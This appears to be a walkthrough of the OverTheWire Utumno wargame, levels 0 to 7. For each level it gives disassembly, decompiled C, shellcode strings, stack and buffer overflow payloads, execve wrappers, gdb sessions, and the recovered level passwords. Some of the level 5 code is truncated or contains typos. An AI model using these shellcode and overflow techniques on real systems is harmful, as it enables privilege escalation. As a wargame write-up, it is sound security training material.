http://overthewire.org/wargames/utumno/

# level0

thanks to https://r4stl1n.github.io/2014/12/21/OverTheWire-Utumno0.html

first, we try to run it:

```shell
utumno0@utumno:/utumno$ ./utumno0
Read me! :P
utumno0@utumno:/utumno$ file utumno0
utumno0: executable, regular file, no read permission
```

in fact, there has tips, which means, it need us to read it.

```shell
utumno0@utumno:/utumno$ cat utumno0
cat: utumno0: Permission denied
```

but we do not have the permission here.

```shell
---x--x---  1 utumno1 utumno0 7188 Aug 26 22:44 utumno0
---s--x---  1 utumno1 utumno0 7188 Aug 26 22:44 utumno0_hard
-r-sr-x---  1 utumno2 utumno1 8052 Aug 26 22:44 utumno1
-r-sr-x---  1 utumno3 utumno2 7484 Aug 26 22:44 utumno2
-r-sr-x---  1 utumno4 utumno3 7412 Aug 26 22:44 utumno3
-r-sr-x---  1 utumno5 utumno4 7672 Aug 26 22:44 utumno4
-r-sr-x---  1 utumno6 utumno5 7980 Aug 26 22:44 utumno5
-r-sr-x---  1 utumno7 utumno6 8116 Aug 26 22:44 utumno6
-r-sr-x---  1 utumno8 utumno7 8504 Aug 26 22:44 utumno7
```

we will find that the we only have the execute permission. 

try to replace the puts function, let it printout the whole stack. The definition of puts function is:

```shell
Definition:
int puts(const char *s);

Return:
puts() and fputs() return a non-negative number on success, or EOF on error.
```

then we can replace the puts function with our own function:

```c
//hookputs.c

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>
 
int puts(const char *s) {
    int i;
    char *pt;

    // Variable to store the original puts function. just incase we need it.
    static void* (*my_puts)(const char*s) = NULL;

    if (!my_puts){
        // Store the original puts function.
        my_puts = dlsym(RTLD_NEXT, "puts");
    }
 
    // Display our hooked
    printf("Hooked-%s", s);

    return 0;
 
}
```

compile this for the correct archtype-i386, and link it.

```shell
gcc -m32 -fPIC -c testhook.c -o testhook.o && ld -shared -m elf_i386 -o testhook.so testhook.o -ldl
```

and trace it use our shared link:

```shell
utumno0@utumno:/tmp/testaa$ strace -s 100 -E LD_PRELOAD=./testhook.so -e trace=write /utumno/utumno0
strace: [ Process PID=17662 runs in 32 bit mode. ]
write(1, 0x804a008, 18Hooked-Read me! :P)                 = 18
+++ exited with 0 +++
```

It works, so we can try to read the stack near the output strings:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>
 
int puts(const char *s) {
    int i;
    char *pt;

    // Variable to store the original puts function. just incase we need it.
    static void* (*my_puts)(const char*s) = NULL;

 
    if (!my_puts){
        // Store the original puts function.
        my_puts = dlsym(RTLD_NEXT, "puts");
    }

    // Start looking at stack addresses
    printf("%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-");
    // Display our hooked
    printf("Hooked-%s", s);

    return 0;
 
}
```

then try again to see what happend:

```shell
utumno0@utumno:/tmp/testaa$ strace -s 100 -E LD_PRELOAD=./testhook.so -e trace=write /utumno/utumno0
strace: [ Process PID=17708 runs in 32 bit mode. ]
write(1, 0x804a008, 111f7fcf29c-ffffd6b4-f7fcf23c-f7fc3dbc-0-ffffd688-8048402-80484a5-8048490-0-f7e27286-1-ffffd724-Hooked-Read me! :P)                = 111
+++ exited with 0 +++
```

we can see there are some address connected:

```
8048402-80484a5-8048490
```

so we can try to read string from these address:

```shell
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <dlfcn.h>
 
int puts(const char *s) {
    int i;
    char *pt;

    // Variable to store the original puts function. just incase we need it.
    static void* (*my_puts)(const char*s) = NULL;
 
    if (!my_puts){
        // Store the original puts function.
        my_puts = dlsym(RTLD_NEXT, "puts");
    }

    // Start looking at stack addresses
    printf("%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-");
    // Display our hooked
    printf("Hooked-%s", s);
    // Run through the memory space.
    for( i = 0x8048402; i < 0x80484a5; i++) {
        pt = i;
        printf("%c", *pt);
        printf("");
    }
    return 0;
}
```

then ,we try agian to see what will happen.

```shell
utumno0@utumno:/tmp/testaa$ strace -s 100 -E LD_PRELOAD=./testhook.so -e trace=write /utumno/utumno0
strace: [ Process PID=17785 runs in 32 bit mode. ]
write(1, 0x804a008, 281f7fcf2fc-1-f7fcf26c-ffffd688-f7fee710-ffffd6b4-f7fcf260-f7fc3dbc-0-ffffd688-8048402-80484a5-8048490-Hooked-Read me! :P�����f�f�UWVS�����Û��
                                                                                                                                                                  �l$ ��
                                                                                                                                                                        ����W�������)�����t%1������t$,�t$,U���������9�u��
                                    [^_]Ív��S�������7�[�password: aathaeyiew)                = 281
+++ exited with 0 +++
```

then we got the passwd.

# level1

```shell
ssh utumno1@utumno.labs.overthewire.org -p2227
aathaeyiew
```

https://nicolagatta.blogspot.com/2019/06/overthewireorg-utumno-level-1-writeup.html?view=flipcard

ceewaceiph

# level2

## Check the assembly

```assembly
 08048300 <strcpy@plt>:
 8048300:	ff 25 24 97 04 08    	jmp    *0x8049724
 8048306:	68 00 00 00 00       	push   $0x0
 804830b:	e9 e0 ff ff ff       	jmp    80482f0 <.plt>
 
...
 0804844b <main>:
 804844b:	55                   	push   %ebp
 804844c:	89 e5                	mov    %esp,%ebp
 804844e:	83 ec 0c             	sub    $0xc,%esp
 8048451:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
 8048455:	74 14                	je     804846b <main+0x20>
 8048457:	68 10 85 04 08       	push   $0x8048510
 804845c:	e8 af fe ff ff       	call   8048310 <puts@plt>
 8048461:	83 c4 04             	add    $0x4,%esp
 8048464:	6a 01                	push   $0x1
 8048466:	e8 b5 fe ff ff       	call   8048320 <exit@plt>
 804846b:	8b 45 0c             	mov    0xc(%ebp),%eax
 804846e:	83 c0 28             	add    $0x28,%eax
 8048471:	8b 00                	mov    (%eax),%eax
 8048473:	50                   	push   %eax
 8048474:	8d 45 f4             	lea    -0xc(%ebp),%eax
 8048477:	50                   	push   %eax
 8048478:	e8 83 fe ff ff       	call   8048300 <strcpy@plt>
 804847d:	83 c4 08             	add    $0x8,%esp
 8048480:	b8 00 00 00 00       	mov    $0x0,%eax
 8048485:	c9                   	leave
 8048486:	c3                   	ret
 8048487:	66 90                	xchg   %ax,%ax
 8048489:	66 90                	xchg   %ax,%ax
 804848b:	66 90                	xchg   %ax,%ax
 804848d:	66 90                	xchg   %ax,%ax
 804848f:	90                   	nop
```

We checked the assembly: if the argc is zero, the program will jump to the second branch do the strcpy. So we built a program to trigger this branch.

```c
#include <stdio.h>
#include <unistd.h>
int main( ) {
    char *argv[] = {NULL};
    execv("/utumno/utumno2", argv);
    return 0;
}
```

```
gcc -m32 -o enp.out enp.c 
```

```shell
utumno2@utumno:/tmp/utum2$ ltrace ./enp.out
execv("/utumno/utumno2", 0x7fffffffe578 <no return ...>
--- Called exec() ---
__libc_start_main(0x804844b, 0, 0xffffd764, 0x8048490 <unfinished ...>
strcpy(0xffffd69c, "SSH_CLIENT=129.21.122.176 53923")       = 0xffffd69c
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

## Insert shellcode

Insert shellcode into the environment

```shell
export CODE=$(python -c 'print "\x90"*100+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"') 
```

printenv

## Find address

Find the address of the environment we insert

```shell
(gdb) b main
Breakpoint 1 at 0x8048451: file utumno2.c, line 23.
(gdb) x/s *((char **)environ+9)
No symbol "environ" in current context.
(gdb) r
Starting program: /utumno/utumno2

Breakpoint 1, main (argc=1, argv=0xffffd704) at utumno2.c:23
23	utumno2.c: No such file or directory.
......
(gdb) x/s *((char **)environ+13)
0xffffdea3:	"CODE=", '\220' <repeats 100 times>, "j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341̀"
```

## Change address

Change the content of environment the program copy from

```shell
export SSH_CLIENT=$(python -c "print 'a'*5+'\xa3\xde\xff\xff' ")
```

0xffffdea3

\xa3\xde\xff\xff

## Run

```shell
utumno2@utumno:/tmp/utum2$ ./enp.out
bash-4.4$ whoami
utumno3
bash-4.4$ cat /etc/utumno_pass/utumno3
zuudafiine
```

# level3

```assembly
080483eb <main>:
 80483eb:	55                   	push   %ebp
 80483ec:	89 e5                	mov    %esp,%ebp
 80483ee:	53                   	push   %ebx
 80483ef:	83 ec 38             	sub    $0x38,%esp
 80483f2:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
 80483f9:	8b 45 f4             	mov    -0xc(%ebp),%eax
 80483fc:	89 45 f8             	mov    %eax,-0x8(%ebp)
 80483ff:	eb 4c                	jmp    804844d <main+0x62>
 8048401:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048404:	89 c1                	mov    %eax,%ecx
 8048406:	8d 55 c4             	lea    -0x3c(%ebp),%edx
 8048409:	8b 45 f8             	mov    -0x8(%ebp),%eax
 804840c:	01 d0                	add    %edx,%eax
 804840e:	88 08                	mov    %cl,(%eax)
 8048410:	8d 55 c4             	lea    -0x3c(%ebp),%edx
 8048413:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048416:	01 d0                	add    %edx,%eax
 8048418:	0f b6 08             	movzbl (%eax),%ecx
 804841b:	8b 45 f8             	mov    -0x8(%ebp),%eax
 804841e:	89 c2                	mov    %eax,%edx
 8048420:	89 d0                	mov    %edx,%eax
 8048422:	01 c0                	add    %eax,%eax
 8048424:	01 d0                	add    %edx,%eax
 8048426:	31 c1                	xor    %eax,%ecx
 8048428:	8d 55 c4             	lea    -0x3c(%ebp),%edx
 804842b:	8b 45 f8             	mov    -0x8(%ebp),%eax
 804842e:	01 d0                	add    %edx,%eax
 8048430:	88 08                	mov    %cl,(%eax)
 8048432:	8d 55 c4             	lea    -0x3c(%ebp),%edx
 8048435:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048438:	01 d0                	add    %edx,%eax
 804843a:	0f b6 00             	movzbl (%eax),%eax
 804843d:	0f be d8             	movsbl %al,%ebx
 8048440:	e8 7b fe ff ff       	call   80482c0 <getchar@plt>
 8048445:	88 44 1d dc          	mov    %al,-0x24(%ebp,%ebx,1)
 8048449:	83 45 f8 01          	addl   $0x1,-0x8(%ebp)
 804844d:	e8 6e fe ff ff       	call   80482c0 <getchar@plt>
 8048452:	89 45 f4             	mov    %eax,-0xc(%ebp)
 8048455:	83 7d f4 ff          	cmpl   $0xffffffff,-0xc(%ebp)
 8048459:	74 06                	je     8048461 <main+0x76>
 804845b:	83 7d f8 17          	cmpl   $0x17,-0x8(%ebp)
 804845f:	7e a0                	jle    8048401 <main+0x16>
 8048461:	b8 00 00 00 00       	mov    $0x0,%eax
 8048466:	83 c4 38             	add    $0x38,%esp
 8048469:	5b                   	pop    %ebx
 804846a:	5d                   	pop    %ebp
 804846b:	c3                   	ret
 804846c:	66 90                	xchg   %ax,%ax
 804846e:	66 90                	xchg   %ax,%ax
```

From this assembly, we found that the logic can be a little difficult to understand, so we can use tool to help decompile the program.

phidra: https://github.com/NationalSecurityAgency/ghidra

After phidra, we got the C-code of utumno3.

```c
int main(int argc,char **argv)
{
  char cVar1;
  int iVar2;
  char b [24];
  char a [24];
  int c;
  int i;
  
  i = 0;
  while( true ) {
    iVar2 = getchar();
    if ((iVar2 == -1) || (0x17 < i)) break;
    b[i] = (char)iVar2;
    b[i] = b[i] ^ (char)i * '\x03';
    cVar1 = b[i];
    iVar2 = getchar();
    a[cVar1] = (char)iVar2;
    i = i + 1;
  }
  return 0;
}
```

`a[cVar1] = (char)iVar2;` is the buffer overflow vulnerability. 

`cVar1` is controlled by input; `iVar2` is also controlled by input.

There are 0x28 bytes from the beginning of `a[]` to `RET`.

```c
0x28 = input[0] ^ (0\*3)  ⇒ input[0] = 0x28 = (
0x29 = input[1] ^ (1\*3)  ⇒ input[1] = 0x2a = \*
0x2a = input[2] ^ (2\*3)  ⇒ input[2] = 0x2c = ,
0x2b = input[3] ^ (3*3)  ⇒ input[3] = 0x22 = “
```

So, we can put the shellcode in a env variable, and overwrite the RET.

Then we can do the same thing as level2, export the shellcode into the environment and find out the address of the new environment then use the address as input for utumno3

Now I have the address of the shellcode: `0xffffdea3`

```shell
utumno3@utumno:/utumno$ (python -c 'print "\x28\xb3\x2a\xde\x2c\xff\x22\xff"+"\n"*15';cat) | ./utumno3
whoami
utumno4
cat /etc/utumno_pass/utumno4
oogieleoga
```

**Note: there is a loop(0x17<i) in the main function, so we need more inputs to end the loop.**



Another trier, not finished.

$1 = {<text variable, no debug info>} 0xf7e4c850 <system>

We can not use the stack

return to libc

# level4

```shell
utumno4@utumno:/utumno$ file utumno4
utumno4: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cb2abb9ecb95965e254760b5b1940e5efff1a807, not stripped

utumno4@utumno:/utumno$ utumno4 123456
-bash: utumno4: command not found

utumno4@utumno:/utumno$ ltrace ./utumno4 123456
__libc_start_main(0x804844b, 2, 0xffffd744, 0x80484a0 <unfinished ...>
atoi(0xffffd87f, 0, 0, 0)                             = 0x1e240
exit(1 <no return ...>
+++ exited (status 1) +++
```

use `objdump -d ./utumno4` to get assembly code.

```assembly
0804844b <main>:
 804844b:	55                   	push   %ebp
 804844c:	89 e5                	mov    %esp,%ebp
 804844e:	81 ec 04 ff 00 00    	sub    $0xff04,%esp
 8048454:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048457:	83 c0 04             	add    $0x4,%eax
 804845a:	8b 00                	mov    (%eax),%eax
 804845c:	50                   	push   %eax
 804845d:	e8 ce fe ff ff       	call   8048330 <atoi@plt>
 8048462:	83 c4 04             	add    $0x4,%esp
 8048465:	89 45 fc             	mov    %eax,-0x4(%ebp)
 8048468:	8b 45 fc             	mov    -0x4(%ebp),%eax
 804846b:	66 89 45 fa          	mov    %ax,-0x6(%ebp)
 804846f:	66 83 7d fa 3f       	cmpw   $0x3f,-0x6(%ebp)
 8048474:	76 07                	jbe    804847d <main+0x32>
 8048476:	6a 01                	push   $0x1
 8048478:	e8 93 fe ff ff       	call   8048310 <exit@plt>
 804847d:	8b 55 fc             	mov    -0x4(%ebp),%edx
 8048480:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048483:	83 c0 08             	add    $0x8,%eax
 8048486:	8b 00                	mov    (%eax),%eax
 8048488:	52                   	push   %edx
 8048489:	50                   	push   %eax
 804848a:	8d 85 fe 00 ff ff    	lea    -0xff02(%ebp),%eax
 8048490:	50                   	push   %eax
 8048491:	e8 6a fe ff ff       	call   8048300 <memcpy@plt>
 8048496:	83 c4 0c             	add    $0xc,%esp
 8048499:	b8 00 00 00 00       	mov    $0x0,%eax
 804849e:	c9                   	leave
 804849f:	c3                   	ret
```

jbe uses unsigned number(all jump instructions use unsigned) , jbe compares with the second parameter you input with 0x3f. 

which means, we need to make the 16-low bits of the second parameter smaller than 0x003f

Insert the shellcode in the environment, than find the address.

Another way is to put the shellcode in the stack.

int(0xff02) = 65282

0xffffdea3

\xa3\xde\xff\xff

```
utumno4@utumno:/tmp/utu4$ /utumno/utumno4 65536 $(python -c 'print "a"*65286+"\xa3\xde\xff\xff"')
bash-4.4$ whoami
utumno5
bash-4.4$ cat /etc/utumno_pass/utumno5
woucaejiek
```

# level5

```shell
utumno5@utumno:/utumno$ file utumno5
utumno5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=264ea5eac8d3b9212458489b2e253740d44c69f7, not stripped
```

strcpy(dest, src)

```assembly
08048516 <main>:
 8048516:	55                   	push   %ebp
 8048517:	89 e5                	mov    %esp,%ebp
 8048519:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
 804851d:	74 14                	je     8048533 <main+0x1d>
 804851f:	68 f0 85 04 08       	push   $0x80485f0
 8048524:	e8 57 fe ff ff       	call   8048380 <puts@plt>
 8048529:	83 c4 04             	add    $0x4,%esp
 804852c:	6a 01                	push   $0x1
 804852e:	e8 5d fe ff ff       	call   8048390 <exit@plt>
 8048533:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048536:	83 c0 28             	add    $0x28,%eax
 8048539:	8b 00                	mov    (%eax),%eax
 804853b:	50                   	push   %eax
 804853c:	68 f5 85 04 08       	push   $0x80485f5
 8048541:	e8 1a fe ff ff       	call   8048360 <printf@plt>
 8048546:	83 c4 08             	add    $0x8,%esp
 8048549:	8b 45 0c             	mov    0xc(%ebp),%eax
 804854c:	83 c0 28             	add    $0x28,%eax
 804854f:	8b 00                	mov    (%eax),%eax
 8048551:	50                   	push   %eax
 8048552:	e8 84 ff ff ff       	call   80484db <hihi>
 8048557:	83 c4 04             	add    $0x4,%esp
 804855a:	b8 00 00 00 00       	mov    $0x0,%eax
 804855f:	c9                   	leave
 8048560:	c3                   	ret
 8048561:	66 90                	xchg   %ax,%ax
 8048563:	66 90                	xchg   %ax,%ax
 8048565:	66 90                	xchg   %ax,%ax
 8048567:	66 90                	xchg   %ax,%ax
 8048569:	66 90                	xchg   %ax,%ax
 804856b:	66 90                	xchg   %ax,%ax
 804856d:	66 90                	xchg   %ax,%ax
 804856f:	90                   	nop
```

From the assembly, we need to trigger the branch which will call function hihi. So when utumno5 runs, the argv should be zero.

```c
// a.c, call utumno5 with argv zero
#include <stdio.h>
#include <unistd.h>
int main( ) {
    char *argv[] = {NULL};
    execv("/utumno/utumno5", argv);
    return 0;
}
```

```shell
gcc -m32 -o a.out a.c
```

Then let's look at hihi function.

```assembly
080484db <hihi>:
 80484db:	55                   	push   %ebp
 80484dc:	89 e5                	mov    %esp,%ebp
 80484de:	83 ec 0c             	sub    $0xc,%esp
 80484e1:	ff 75 08             	pushl  0x8(%ebp)
 80484e4:	e8 b7 fe ff ff       	call   80483a0 <strlen@plt>
 80484e9:	83 c4 04             	add    $0x4,%esp
 80484ec:	83 f8 13             	cmp    $0x13,%eax
 80484ef:	76 13                	jbe    8048504 <hihi+0x29>
 80484f1:	6a 14                	push   $0x14
 80484f3:	ff 75 08             	pushl  0x8(%ebp)
 80484f6:	8d 45 f4             	lea    -0xc(%ebp),%eax
 80484f9:	50                   	push   %eax
 80484fa:	e8 c1 fe ff ff       	call   80483c0 <strncpy@plt>
 80484ff:	83 c4 0c             	add    $0xc,%esp
 8048502:	eb 0f                	jmp    8048513 <hihi+0x38>
 8048504:	ff 75 08             	pushl  0x8(%ebp)
 8048507:	8d 45 f4             	lea    -0xc(%ebp),%eax
 804850a:	50                   	push   %eax
 804850b:	e8 60 fe ff ff       	call   8048370 <strcpy@plt>
 8048510:	83 c4 08             	add    $0x8,%esp
 8048513:	90                   	nop
 8048514:	c9                   	leave
 8048515:	c3                   	ret
```

strcpy is an unsafe function because it doesn't check the lenghth of sources string of copying. but srcncpy will check the length of resources string. So we need to trigger the strcpy function. The trigger condition is 

```assembly
 80484ec:	83 f8 13             	cmp    $0x13,%eax
 80484ef:	76 13                	jbe    8048504 <hihi+0x29>
```

We can check what's the resource string the strcpy function copys from.

```shell
utumno5@utumno:/tmp/utum5$ ltrace ./a.out
__libc_start_main(0x56555590, 1, 0xffffd754, 0x565555e0 <unfinished ...>
execv("/utumno/utumno5", 0xffffd69c <no return ...>
--- Called exec() ---
__libc_start_main(0x8048516, 0, 0xffffd754, 0x8048570 <unfinished ...>
printf("Here we go - %s\n", "LC_TERMINAL_VERSION=3.3.6"Here we go - LC_TERMINAL_VERSION=3.3.6
) = 39
strlen("LC_TERMINAL_VERSION=3.3.6")                   = 25
strncpy(0xffffd6a0, "LC_TERMINAL_VERSION=", 20)       = 0xffffd6a0
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

we can find out where is the environment `LC_TERMINAL_VERSION` is:

```shell
(gdb) x/s *((char **)environ+10)
0xffffdedf:	"LC_TERMINAL=iTerm2"
(gdb) x/s *((char **)environ+11)
0xffffdef2:	"SSH_CLIENT=24.59.157.177 50175 22"
(gdb) x/s *((char **)environ+12)
0xffffdf14:	"LC_TERMINAL_VERSION=3.3.6"
```



```
#include <stdio.h>
#include <unistd.h>
int main( ) {
    char *argv[]={NULL};
    char *env[12];
    env[0]=env[1]=env[2]=env[3]=env[4]=env[5]=env[6]=env[7]=env[8]=env[9]="";
    env[9] = "";
    env[10] = "LC_TERMINAL_VERSION=\xcd\xdf\xff\xff\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f$
    env[11] = NULL;
    execve("/utumno/utumno5",argv,env);
    return 0;
}


#include <stdio.h>
#include <unistd.h>
int main( ) {
    char *argv[]={NULL};
    argv[9] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x28\xdf\xff\xff";
    argv[10] = "LC_TERMINAL_VERSION=\xcd\xdf\xff\xff\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";
    execve("/utumno/utumno5", NULL,argv);
    return 0;
}
```





it works!

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char** argv) {
	char* argc[] = {NULL};
	char* env[] = {"AAAA", "AAAA", "AAAA", "AAAA" ,"AAAA","AAAA",
	"AAAA","AAAA",
	"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80",
	"BBBBBBBBBBBBFFFF\xbd\xdf\xfsf\xff", NULL};
	execve("/utumno/utumno5", argc, env);
	perror("execve");
}

eiluquieth
```

![img](https://lh4.googleusercontent.com/5ce-UD_ZSIiWviGF_l6AdxPAVcfgBIlkY8ofWf_Wa4vLR7an62DGxvOfh5urYOeAifRKuM-BsjK93UePnNlYgHX9uVnKH-b2EP3-eVx2Kj2XOtHM7ZyGsO_L2Ir2JnRx2gkuztgDLpA)

# level6

```assembly
080484db <main>:
 80484db:	55                   	push   %ebp
 80484dc:	89 e5                	mov    %esp,%ebp
 80484de:	83 ec 34             	sub    $0x34,%esp
 80484e1:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
 80484e5:	7f 14                	jg     80484fb <main+0x20>
 80484e7:	68 30 86 04 08       	push   $0x8048630
 80484ec:	e8 9f fe ff ff       	call   8048390 <puts@plt>
 80484f1:	83 c4 04             	add    $0x4,%esp
 80484f4:	6a 01                	push   $0x1
 80484f6:	e8 a5 fe ff ff       	call   80483a0 <exit@plt>
 80484fb:	6a 20                	push   $0x20
 80484fd:	e8 7e fe ff ff       	call   8048380 <malloc@plt>
 8048502:	83 c4 04             	add    $0x4,%esp
 8048505:	89 45 cc             	mov    %eax,-0x34(%ebp)
 8048508:	8b 45 cc             	mov    -0x34(%ebp),%eax
 804850b:	85 c0                	test   %eax,%eax
 804850d:	75 14                	jne    8048523 <main+0x48>
 804850f:	68 3d 86 04 08       	push   $0x804863d
 8048514:	e8 77 fe ff ff       	call   8048390 <puts@plt>
 8048519:	83 c4 04             	add    $0x4,%esp
 804851c:	6a 01                	push   $0x1
 804851e:	e8 7d fe ff ff       	call   80483a0 <exit@plt>
 8048523:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048526:	83 c0 08             	add    $0x8,%eax
 8048529:	8b 00                	mov    (%eax),%eax
 804852b:	6a 10                	push   $0x10
 804852d:	6a 00                	push   $0x0
 804852f:	50                   	push   %eax
 8048530:	e8 7b fe ff ff       	call   80483b0 <strtoul@plt>
 8048535:	83 c4 0c             	add    $0xc,%esp
 8048538:	89 45 fc             	mov    %eax,-0x4(%ebp)
 804853b:	8b 45 0c             	mov    0xc(%ebp),%eax
 804853e:	83 c0 04             	add    $0x4,%eax
 8048541:	8b 00                	mov    (%eax),%eax
 8048543:	6a 0a                	push   $0xa
 8048545:	6a 00                	push   $0x0
 8048547:	50                   	push   %eax
 8048548:	e8 63 fe ff ff       	call   80483b0 <strtoul@plt>
 804854d:	83 c4 0c             	add    $0xc,%esp
 8048550:	89 45 f8             	mov    %eax,-0x8(%ebp)
 8048553:	83 7d f8 0a          	cmpl   $0xa,-0x8(%ebp)
 8048557:	7e 14                	jle    804856d <main+0x92>
 8048559:	68 5c 86 04 08       	push   $0x804865c
 804855e:	e8 2d fe ff ff       	call   8048390 <puts@plt>
 8048563:	83 c4 04             	add    $0x4,%esp
 8048566:	6a 01                	push   $0x1
 8048568:	e8 33 fe ff ff       	call   80483a0 <exit@plt>
 804856d:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048570:	8b 55 fc             	mov    -0x4(%ebp),%edx
 8048573:	89 54 85 d0          	mov    %edx,-0x30(%ebp,%eax,4)
 8048577:	8b 45 0c             	mov    0xc(%ebp),%eax
 804857a:	83 c0 0c             	add    $0xc,%eax
 804857d:	8b 10                	mov    (%eax),%edx
 804857f:	8b 45 cc             	mov    -0x34(%ebp),%eax
 8048582:	52                   	push   %edx
 8048583:	50                   	push   %eax
 8048584:	e8 e7 fd ff ff       	call   8048370 <strcpy@plt>
 8048589:	83 c4 08             	add    $0x8,%esp
 804858c:	8b 55 cc             	mov    -0x34(%ebp),%edx
 804858f:	8b 45 f8             	mov    -0x8(%ebp),%eax
 8048592:	8b 44 85 d0          	mov    -0x30(%ebp,%eax,4),%eax
 8048596:	52                   	push   %edx
 8048597:	50                   	push   %eax
 8048598:	ff 75 f8             	pushl  -0x8(%ebp)
 804859b:	68 84 86 04 08       	push   $0x8048684
 80485a0:	e8 bb fd ff ff       	call   8048360 <printf@plt>
 80485a5:	83 c4 10             	add    $0x10,%esp
 80485a8:	b8 00 00 00 00       	mov    $0x0,%eax
 80485ad:	c9                   	leave
 80485ae:	c3                   	ret
 80485af:	90                   	nop
```



```c
int main(int argc,char **argv)
{
  ulong uVar1;
  a b;
  int pos;
  int val;
  
  if (argc < 3) {
    puts("Missing args");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  b.p = (char *)malloc(0x20);
  if (b.p == (char *)0x0) {
    puts("Sorry, ran out of memory :-(");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  uVar1 = strtoul(argv[2],(char **)0x0,0x10);
  pos = strtoul(argv[1],(char **)0x0,10);
  if (10 < pos) {
    puts("Illegal position in table, quitting..");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  b.table[pos] = uVar1;
  strcpy(b.p,argv[3]);
  printf("Table position %d has value %d\nDescription: %s\n",pos,b.table[pos],b.p);
  return 0;
}
```



```c
// get address of the shellcode we insert in the environment
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    char* ptr = getenv("SCODE");
    printf("%p\n", ptr);
}

```

```shell
(gdb) br main
Breakpoint 1 at 0x80484e1: file utumno6.c, line 35.
(gdb) run
Starting program: /utumno/utumno6

Breakpoint 1, main (argc=1, argv=0xffffd6a4) at utumno6.c:35
35	utumno6.c: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xffffd610:
 eip = 0x80484e1 in main (utumno6.c:35); saved eip = 0xf7e2a286
 source language c.
 Arglist at 0xffffd608, args: argc=1, argv=0xffffd6a4
 Locals at 0xffffd608, Previous frame's sp is 0xffffd610
 Saved registers:
  ebp at 0xffffd608, eip at 0xffffd60c
Insert the shellcode in the environment then get the address
run
utumno6@utumno:/tmp/utu6$ /utumno/utumno6 $(python -c 'print "-1 ffffd60c \xa7\xde\xff\xff"')
bash-4.4$ cat /etc/utumno_pass/utumno7
totiquegae

```

# level 7

```shell
utumno7@utumno:/utumno$ ltrace ./utumno7 aa
__libc_start_main(0x8048501, 2, 0xffffd744, 0x8048550 <unfinished ...>
puts("lol ulrich && fuck hector"lol ulrich && fuck hector
)                                                                               = 26
_setjmp(0xffffd5fc, 0, 0, 0x5de96b3c)                                                                           = 0
strcpy(0xffffd57c, "aa")                                                                                        = 0xffffd57c
longjmp(0xffffd5fc, 23, 0xffffd69c, 0x80484f7 <no return ...>
+++ exited (status 0) +++
```



```assembly
080484ab <vuln>:
 80484ab:	55                   	push   %ebp
 80484ac:	89 e5                	mov    %esp,%ebp
 80484ae:	81 ec 20 01 00 00    	sub    $0x120,%esp
 80484b4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
 80484bb:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
 80484c1:	a3 68 98 04 08       	mov    %eax,0x8049868
 80484c6:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
 80484cc:	50                   	push   %eax
 80484cd:	e8 7e fe ff ff       	call   8048350 <_setjmp@plt>
 80484d2:	83 c4 04             	add    $0x4,%esp
 80484d5:	89 45 fc             	mov    %eax,-0x4(%ebp)
 80484d8:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
 80484dc:	75 1c                	jne    80484fa <vuln+0x4f>
 80484de:	ff 75 08             	pushl  0x8(%ebp)
 80484e1:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
 80484e7:	50                   	push   %eax
 80484e8:	e8 73 fe ff ff       	call   8048360 <strcpy@plt>
 80484ed:	83 c4 08             	add    $0x8,%esp
 80484f0:	6a 17                	push   $0x17
 80484f2:	e8 3f 00 00 00       	call   8048536 <jmp>
 80484f7:	83 c4 04             	add    $0x4,%esp
 80484fa:	b8 00 00 00 00       	mov    $0x0,%eax
 80484ff:	c9                   	leave
 8048500:	c3                   	ret

08048501 <main>:
 8048501:	55                   	push   %ebp
 8048502:	89 e5                	mov    %esp,%ebp
 8048504:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
 8048508:	7f 07                	jg     8048511 <main+0x10>
 804850a:	6a 01                	push   $0x1
